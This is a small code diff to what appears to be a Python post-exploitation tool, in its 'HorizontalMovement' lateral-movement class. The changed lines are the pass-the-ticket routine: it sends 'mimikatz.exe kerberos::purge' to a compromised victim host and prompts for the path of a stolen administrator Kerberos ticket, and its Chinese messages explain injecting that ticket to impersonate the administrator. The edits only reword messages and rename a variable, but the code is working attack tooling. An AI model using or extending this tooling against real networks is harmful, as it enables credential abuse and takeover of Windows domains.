@@ -131,11 +131,11 @@ class HorizontalMovement:
         # print('\033[1;32;32m' + "[+] The tickets have been saved in the \"tickets\" folder.As follows:" + '\033[0m')
         # command2 = "dir tickets"
         # self.receive(conn, command2)
-        print('\033[1;32;32m' + "[+] 票据传递攻击,其思想为普通用户注入管理员的票据,从而冒充管理员身份.所以在进行攻击前,我们需要先获取内存中的管理员票据,然后利用mimikatz为普通用户注入管理员的票据,从而冒充管理员身份." + '\033[0m')
-        print('\033[1;32;32m' + "[+] 先清空系统票据:" + '\033[0m')
+        # print('\033[1;32;32m' + "[+] 票据传递攻击,其思想为普通用户注入管理员的票据,从而冒充管理员身份.所以在进行攻击前,我们需要先获取内存中的管理员票据,然后利用mimikatz为普通用户注入管理员的票据,从而冒充管理员身份." + '\033[0m')
+        print('\033[1;32;32m' + "[+] 清空系统票据:" + '\033[0m')
         command2 = "mimikatz.exe \"kerberos::purge\" exit"
         self.receive(conn, command2)
-        print('\033[1;32;32m' + "[+] 下面要求输入管理员的票据在受害者主机上的绝对路径." + '\033[0m')
+        print('\033[1;32;32m' + "[+] 输入管理员票据在受害者主机上的绝对路径:" + '\033[0m')
         # 需要票据的绝对路径
         commands = ["finished"]
         completer = WordCompleter(commands)
@@ -153,9 +153,9 @@ class HorizontalMovement:
         tip = ["back"]
         completer = WordCompleter(tip)
         formatted_text1 = ANSI('\033[1;32;32mPTT > \033[0m')
-        history = InMemoryHistory()
+        history1 = InMemoryHistory()
         while True:
-            command4 = prompt(formatted_text1, completer=completer, history=history)
+            command4 = prompt(formatted_text1, completer=completer, history=history1)
             if command4 == 'back':
                 break
             elif command4 == "":
